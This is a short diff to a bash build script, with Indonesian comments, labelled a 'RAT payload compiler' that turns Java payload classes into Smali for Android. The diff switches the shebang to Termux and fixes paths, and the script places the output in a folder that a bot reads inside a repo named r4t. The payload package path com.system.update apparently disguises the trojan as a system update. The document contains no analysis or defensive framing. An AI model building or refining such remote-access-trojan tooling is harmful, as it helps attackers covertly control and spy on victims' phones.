@@ -1,13 +1,13 @@
-#!/bin/bash
+#!/data/data/com.termux/files/usr/bin/bash
 
 echo "======================================"
 echo "   RAT PAYLOAD COMPILER (JAVA -> SMALI) "
 echo "======================================"
 
-# 1. Bikin folder kerja
-mkdir -p rat_builder/payload_src/com/system/update
-mkdir -p rat_builder/payload_smali
-cd rat_builder/payload_src/com/system/update
+# 1. Bikin folder kerja (sesuai struktur di repo)
+mkdir -p payload_src/com/system/update
+mkdir -p payload_smali
+cd payload_src/com/system/update
 
 # 2. Download alat D8 (buat ubah .class ke .dex)
 if [ ! -f d8.jar ]; then
@@ -35,6 +35,7 @@ java -jar baksmali.jar d classes.dex -o smali_out
 
 # 7. Pindahin hasil Smali ke folder yang dibaca bot
 echo "[~] Memindahkan file Smali ke folder Bot..."
+# Mundur 4 tingkat dari payload_src/com/system/update ke root repo r4t
 cp -r smali_out/com ../../../../payload_smali/
 
 echo "======================================"
